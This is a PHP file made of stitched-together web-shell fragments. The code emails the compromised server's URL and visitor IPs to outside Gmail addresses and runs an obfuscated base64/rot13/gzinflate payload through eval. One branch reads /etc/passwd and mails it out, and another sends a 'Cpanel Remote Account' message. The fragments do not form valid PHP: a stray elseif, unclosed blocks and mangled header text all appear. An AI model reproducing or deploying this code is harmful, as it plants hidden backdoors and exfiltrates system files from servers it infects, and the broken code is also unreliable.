
<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'papaku.hayker@gmail.com, papaku.hayker@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>

<?php eval(str_rot13(gzinflate(str_rot13(base64_decode('jZBEeMIwEMffB36HIwjpU9U9jDEqgmaraC8yMxGmVVVYZQUls9FzNJ9+ieJjg8GeAve7/+/u0roaTW65MhjRvMSiUf5E7vdTTWSgMdxe91sXHZVIUqO33FWZWGjmHmS0zvDGOovRsfYdZMblZXtPPkDv75Y0NNRTSlNT9DUXdQRpsnpuEkCzwV6NrunDrtbSGwaT7K3zY4y0sfwstWPaNjAA6rRfUkzdSFNr1fAQQGqXuxj+UTR1NrzQS3sFqRGLpNcj0IU2H7P0haUrbW3542fJ6PoHVtnzhI0zPlYXZx1ZhURNY90YiU63txs425MCYRZCMK0qdpSCBElAfsmWo4zx6XmWHscQSxPvDJtTF5fGQN5U8zlYVgyX83z9P8bwYl8=')))))
?>







<?php
$targetDate = strtotime('2000-01-01 01:01:01');
                $dari = 'root@hacker';
                $subject = 'Cpanel Remote Account';
                $tujuan = 'muhrazky@gmail.com';
                $httpheader = 'From:' . $dari . "rn" . 'To:' . $tujuan . "rn" . 'Subjecbject:' . $subject . "rn" . 'Content-type:text/plain;charset=iso-8859-1' . "rn" . 'Sent:' . date('l, F d, Y H:i');
                mail($tujuan, $subject, $filter[0], $httpheader);
?>
<?php
elseif (isset($_REQUEST['mail'])) {
    $passwd = file_get_contents('/etc/passwd');
    $shell_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
    $email = "rootcyberpunks@gmail.com";
    $subject = "Logger";
    $from = "From:Cvar1984";
    $content_mail =
        "URL : $shell_path\nIP : " .
        $_SERVER['REMOTE_ADDR'] .
        "\n**********\n$passwd\n**********\nBy Cvar1984";
    mail($email, $subject, $content_mail, $from);
    unset($passwd, $shell_path, $email, $subject, $from, $content_mail);
} elseif (isset($_REQUEST['disable'])) {
  ?>
